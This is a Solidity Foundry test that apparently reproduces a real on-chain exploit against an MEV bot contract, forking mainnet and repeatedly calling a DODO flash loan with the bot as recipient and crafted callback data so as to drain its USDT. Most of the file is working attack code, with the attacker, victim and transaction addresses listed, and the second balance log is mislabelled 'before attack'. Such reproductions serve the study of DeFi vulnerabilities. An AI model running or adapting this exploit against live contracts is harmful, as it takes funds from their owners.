// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~1300 $USDC
// Attacker : https://etherscan.io/address/0xb61e7f192a9ad5d11e2452f53d0ddf91b58239dc
// Attack Contract : https://etherscan.io/address/0x0757d02596ef9840048def00eeb8e0f3862cc7ca
// Vulnerable Contract : https://etherscan.io/address/0x28d949fdfb5d9ea6b604fa6fee3d6548ea779f17
// Attack Tx : https://etherscan.io/tx/0x313d23bdd9277717e3088f32c976479c09d4b8a94d5d94deb835d157fd0850ce

import "forge-std/Test.sol";
import "./../interface.sol";

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IDPPAdvanced DODO = IDPPAdvanced(0x3058EF90929cb8180174D74C507176ccA6835D73);
    address MevBot_addr = 0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_157_843 - 1);
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(DODO), "DODO");
        vm.label(address(MevBot_addr), "MevBot_addr");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker USDC balance before attack", USDC.balanceOf(address(this)), 6);
        bytes memory data = abi.encode(address(this), 16_777_120 * 110 / 100, 0, 0);
        while (USDT.balanceOf(MevBot_addr) > 20 * 1e6) {
            DODO.flashLoan(0, 16_777_120, MevBot_addr, data);
        }
        DODO.flashLoan(0, USDT.balanceOf(MevBot_addr), MevBot_addr, data);
        emit log_named_decimal_uint("Attacker USDC balance before attack", USDC.balanceOf(address(this)), 6);
    }

    fallback() external payable {}
    receive() external payable {}
}
